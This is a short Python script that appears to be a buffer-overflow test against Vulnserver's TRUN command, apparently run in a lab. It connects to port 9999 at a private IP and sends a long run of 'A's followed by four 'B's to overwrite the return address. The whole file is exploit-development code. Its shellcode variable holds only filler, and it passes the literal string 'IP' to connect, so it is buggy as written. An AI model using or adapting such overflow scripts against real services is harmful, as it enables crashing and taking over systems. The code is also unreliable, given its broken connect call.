#! /bin/python3

import sys,socket

shellcode = "A" * 2387 + "B"*4

IP = '10.6.55.107'
port = 9999
trun = 'TRUN /.:/'
try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('IP',port))
    s.send((trun.encode()+shellcode.encode()))
    s.close()

except:
    print("Error connecting to server")
    sys.exit()
